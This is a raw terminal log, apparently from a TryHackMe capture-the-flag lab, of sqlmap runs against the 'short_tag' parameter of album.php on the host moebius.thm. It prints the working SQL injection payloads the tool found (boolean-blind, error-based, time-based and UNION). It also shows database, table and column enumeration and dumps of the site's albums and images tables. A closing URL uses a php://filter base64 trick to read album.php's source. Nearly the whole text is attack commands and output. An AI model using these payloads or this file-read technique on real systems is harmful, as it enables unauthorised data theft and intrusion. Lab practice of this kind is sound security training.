
┌──(alvan㉿vbox)-[~/THM/moebius]
└─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag --risk 3 --level 5 --threads 10 --batch --dbs
        ___
       __H__                                                                                                        
 ___ ___[']_____ ___ ___  {1.8.5#stable}                                                                            
|_ -| . [)]     | .'| . |                                                                                           
|___|_  [.]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:48:48 /2025-08-15/

[18:48:49] [INFO] testing connection to the target URL
[18:48:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:48:51] [INFO] testing if the target URL content is stable
[18:48:52] [INFO] target URL content is stable
[18:48:53] [INFO] heuristic (basic) test shows that GET parameter 'short_tag' might be injectable (possible DBMS: 'MySQL')                                                                                                              
[18:48:54] [INFO] heuristic (XSS) test shows that GET parameter 'short_tag' might be vulnerable to cross-site scripting (XSS) attacks
[18:48:54] [INFO] testing for SQL injection on GET parameter 'short_tag'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:48:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:48:56] [WARNING] reflective value(s) found and filtering out
[18:49:00] [INFO] GET parameter 'short_tag' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --not-string="the")
[18:49:00] [INFO] testing 'Generic inline queries'
[18:49:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                                 
[18:49:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:49:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:49:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:49:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:49:10] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:49:13] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:49:14] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:49:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:49:16] [INFO] GET parameter 'short_tag' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                                                                                           
[18:49:16] [INFO] testing 'MySQL inline queries'
[18:49:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:49:17] [WARNING] time-based comparison requires larger statistical model, please wait............ (done)       
[18:49:37] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[18:49:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:49:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:49:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:49:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:49:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:49:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:49:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[18:49:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[18:50:03] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[18:50:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[18:50:19] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[18:50:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[18:50:36] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[18:50:41] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[18:51:29] [INFO] GET parameter 'short_tag' appears to be 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' injectable 
[18:51:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:51:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:51:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:51:36] [INFO] target URL appears to have 1 column in query
[18:51:47] [INFO] GET parameter 'short_tag' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'short_tag' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 7563=7563-- IGsL

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 3761 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3761=3761,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vzPc

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: short_tag=smart' AND 5750=BENCHMARK(5000000,MD5(0x50755a70))-- JJUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-2214' UNION ALL SELECT CONCAT(0x71626b6271,0x756e71587362614b515a505a6565476471464b4a7268417549625548576e52634453717a54624a6c,0x717a767871)-- -
---
[18:51:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.4.4, Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:51:51] [INFO] fetching database names
[18:51:52] [INFO] starting 2 threads
[18:51:53] [ERROR] thread 0: 'AttributeError: AttributeError: module 'logging' has no attribute '_acquireLock''
[18:51:53] [ERROR] thread 1: 'AttributeError: AttributeError: module 'logging' has no attribute '_acquireLock''
available databases [2]:                                                                                           
[*] information_schema
[*] web

[18:51:54] [INFO] fetched data logged to text files under '/home/alvan/.local/share/sqlmap/output/moebius.thm'
[18:51:54] [WARNING] your sqlmap version is outdated

[*] ending @ 18:51:54 /2025-08-15/

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/moebius]
└─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag -D web --tables
        ___
       __H__                                                                                                        
 ___ ___[)]_____ ___ ___  {1.8.5#stable}                                                                            
|_ -| . [,]     | .'| . |                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:53:54 /2025-08-15/

[18:53:54] [INFO] resuming back-end DBMS 'mysql' 
[18:53:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 7563=7563-- IGsL

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 3761 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3761=3761,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vzPc

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: short_tag=smart' AND 5750=BENCHMARK(5000000,MD5(0x50755a70))-- JJUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-2214' UNION ALL SELECT CONCAT(0x71626b6271,0x756e71587362614b515a505a6565476471464b4a7268417549625548576e52634453717a54624a6c,0x717a767871)-- -
---
[18:53:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.4.4, Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:53:56] [INFO] fetching tables for database: 'web'
[18:53:59] [INFO] retrieved: 'albums'
[18:54:26] [INFO] retrieved: 'images'
Database: web                                                                                                      
[2 tables]
+--------+
| albums |
| images |
+--------+

[18:54:26] [INFO] fetched data logged to text files under '/home/alvan/.local/share/sqlmap/output/moebius.thm'
[18:54:26] [WARNING] your sqlmap version is outdated

[*] ending @ 18:54:26 /2025-08-15/

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/moebius]
└─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag -D web -T albums --columns
        ___
       __H__                                                                                                        
 ___ ___[(]_____ ___ ___  {1.8.5#stable}                                                                            
|_ -| . ["]     | .'| . |                                                                                           
|___|_  [(]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:54:51 /2025-08-15/

[18:54:51] [INFO] resuming back-end DBMS 'mysql' 
[18:54:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 7563=7563-- IGsL

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 3761 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3761=3761,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vzPc

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: short_tag=smart' AND 5750=BENCHMARK(5000000,MD5(0x50755a70))-- JJUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-2214' UNION ALL SELECT CONCAT(0x71626b6271,0x756e71587362614b515a505a6565476471464b4a7268417549625548576e52634453717a54624a6c,0x717a767871)-- -
---
[18:54:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP 8.4.4
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:54:53] [INFO] fetching columns for table 'albums' in database 'web'
[18:54:59] [INFO] retrieved: 'short_tag','text'
[18:55:00] [INFO] retrieved: 'name','text'
[18:55:01] [INFO] retrieved: 'description','text'
Database: web                                                                                                      
Table: albums
[3 columns]
+-------------+------+
| Column      | Type |
+-------------+------+
| description | text |
| name        | text |
| short_tag   | text |
+-------------+------+

[18:55:01] [INFO] fetched data logged to text files under '/home/alvan/.local/share/sqlmap/output/moebius.thm'
[18:55:01] [WARNING] your sqlmap version is outdated

[*] ending @ 18:55:01 /2025-08-15/

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/moebius]
└─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag -D web -T images --columns
        ___
       __H__                                                                                                        
 ___ ___[(]_____ ___ ___  {1.8.5#stable}                                                                            
|_ -| . [']     | .'| . |                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:55:22 /2025-08-15/

[18:55:23] [INFO] resuming back-end DBMS 'mysql' 
[18:55:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 7563=7563-- IGsL

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 3761 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3761=3761,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vzPc

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: short_tag=smart' AND 5750=BENCHMARK(5000000,MD5(0x50755a70))-- JJUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-2214' UNION ALL SELECT CONCAT(0x71626b6271,0x756e71587362614b515a505a6565476471464b4a7268417549625548576e52634453717a54624a6c,0x717a767871)-- -
---
[18:55:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP 8.4.4
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:55:24] [INFO] fetching columns for table 'images' in database 'web'
[18:55:32] [INFO] retrieved: 'path','text'
Database: web                                                                                                      
Table: images
[1 column]
+--------+------+
| Column | Type |
+--------+------+
| path   | text |
+--------+------+

[18:55:32] [INFO] fetched data logged to text files under '/home/alvan/.local/share/sqlmap/output/moebius.thm'
[18:55:32] [WARNING] your sqlmap version is outdated

[*] ending @ 18:55:32 /2025-08-15/

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/moebius]
└─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag -D web -T albums --dump   
        ___
       __H__                                                                                                        
 ___ ___[)]_____ ___ ___  {1.8.5#stable}                                                                            
|_ -| . ["]     | .'| . |                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:56:00 /2025-08-15/

[18:56:01] [INFO] resuming back-end DBMS 'mysql' 
[18:56:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 7563=7563-- IGsL

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 3761 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3761=3761,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vzPc

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: short_tag=smart' AND 5750=BENCHMARK(5000000,MD5(0x50755a70))-- JJUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-2214' UNION ALL SELECT CONCAT(0x71626b6271,0x756e71587362614b515a505a6565476471464b4a7268417549625548576e52634453717a54624a6c,0x717a767871)-- -
---
[18:56:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.4.4, Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:56:02] [INFO] fetching columns for table 'albums' in database 'web'
[18:56:20] [INFO] resumed: 'short_tag','text'
[18:56:20] [INFO] resumed: 'name','text'
[18:56:20] [INFO] resumed: 'description','text'
[18:56:20] [INFO] fetching entries for table 'albums' in database 'web'                                            
[18:57:01] [INFO] retrieved: 'Cutest cats in the world'                                                            
[18:57:02] [INFO] retrieved: 'Cute cats'
[18:57:03] [INFO] retrieved: 'cute'
[18:57:04] [INFO] retrieved: 'My favourite ones'
[18:57:05] [INFO] retrieved: 'Favourite cats'
[18:57:06] [INFO] retrieved: 'fav'
[18:57:06] [INFO] retrieved: 'So smart...'
[18:57:13] [INFO] retrieved: 'Smart cats'
[18:57:15] [INFO] retrieved: 'smart'
Database: web
Table: albums
[3 entries]
+----------------+-----------+--------------------------+
| name           | short_tag | description              |
+----------------+-----------+--------------------------+
| Cute cats      | cute      | Cutest cats in the world |
| Favourite cats | fav       | My favourite ones        |
| Smart cats     | smart     | So smart...              |
+----------------+-----------+--------------------------+

[18:57:15] [INFO] table 'web.albums' dumped to CSV file '/home/alvan/.local/share/sqlmap/output/moebius.thm/dump/web/albums.csv'                                                                                                        
[18:57:15] [INFO] fetched data logged to text files under '/home/alvan/.local/share/sqlmap/output/moebius.thm'
[18:57:15] [WARNING] your sqlmap version is outdated

[*] ending @ 18:57:15 /2025-08-15/

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/moebius]
└─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag -D web -T images --dump
        ___
       __H__                                                                                                        
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                            
|_ -| . [.]     | .'| . |                                                                                           
|___|_  ["]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:57:59 /2025-08-15/

[18:57:59] [INFO] resuming back-end DBMS 'mysql' 
[18:57:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: short_tag=smart' AND 7563=7563-- IGsL

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=smart' AND (SELECT 3761 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(3761=3761,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vzPc

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: short_tag=smart' AND 5750=BENCHMARK(5000000,MD5(0x50755a70))-- JJUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: short_tag=-2214' UNION ALL SELECT CONCAT(0x71626b6271,0x756e71587362614b515a505a6565476471464b4a7268417549625548576e52634453717a54624a6c,0x717a767871)-- -
---
[18:58:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62, PHP 8.4.4
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:58:01] [INFO] fetching columns for table 'images' in database 'web'
[18:58:05] [INFO] resumed: 'path','text'
[18:58:05] [INFO] fetching entries for table 'images' in database 'web'                                            
[18:58:08] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:09] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:10] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:11] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:12] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:14] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:15] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:16] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:16] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:19] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:20] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:21] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:22] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:23] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:24] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:24] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:27] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:58:28] [INFO] retrieved: '/var/www/images/cat1.jpg'
[18:58:31] [INFO] retrieved: '/var/www/images/cat10.webp'
[18:58:38] [INFO] retrieved: '/var/www/images/cat11.webp'
[18:58:39] [INFO] retrieved: '/var/www/images/cat12.webp'
[18:58:39] [INFO] retrieved: '/var/www/images/cat13.jpg'
[18:58:41] [INFO] retrieved: '/var/www/images/cat14.webp'
[18:58:42] [INFO] retrieved: '/var/www/images/cat15.webp'
[18:58:43] [INFO] retrieved: '/var/www/images/cat16.webp'
[18:58:43] [INFO] retrieved: '/var/www/images/cat2.jpg'
[18:58:44] [INFO] retrieved: '/var/www/images/cat3.jpg'
[18:58:45] [INFO] retrieved: '/var/www/images/cat4.jpg'
[18:58:46] [INFO] retrieved: '/var/www/images/cat5.avif'
[18:58:46] [INFO] retrieved: '/var/www/images/cat6.avif'
[18:58:47] [INFO] retrieved: '/var/www/images/cat7.png'
[18:58:48] [INFO] retrieved: '/var/www/images/cat8.webp'
[18:59:04] [INFO] retrieved: '/var/www/images/cat9.webp'
Database: web
Table: images
[16 entries]
+----------------------------+
| path                       |
+----------------------------+
| /var/www/images/cat1.jpg   |
| /var/www/images/cat10.webp |
| /var/www/images/cat11.webp |
| /var/www/images/cat12.webp |
| /var/www/images/cat13.jpg  |
| /var/www/images/cat14.webp |
| /var/www/images/cat15.webp |
| /var/www/images/cat16.webp |
| /var/www/images/cat2.jpg   |
| /var/www/images/cat3.jpg   |
| /var/www/images/cat4.jpg   |
| /var/www/images/cat5.avif  |
| /var/www/images/cat6.avif  |
| /var/www/images/cat7.png   |
| /var/www/images/cat8.webp  |
| /var/www/images/cat9.webp  |
+----------------------------+

[18:59:04] [INFO] table 'web.images' dumped to CSV file '/home/alvan/.local/share/sqlmap/output/moebius.thm/dump/web/images.csv'                                                                                                        
[18:59:04] [INFO] fetched data logged to text files under '/home/alvan/.local/share/sqlmap/output/moebius.thm'
[18:59:04] [WARNING] your sqlmap version is outdated

[*] ending @ 18:59:04 /2025-08-15/



        http://moebius.thm/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&path=php://filter/convert.base64-encode/resource=album.php
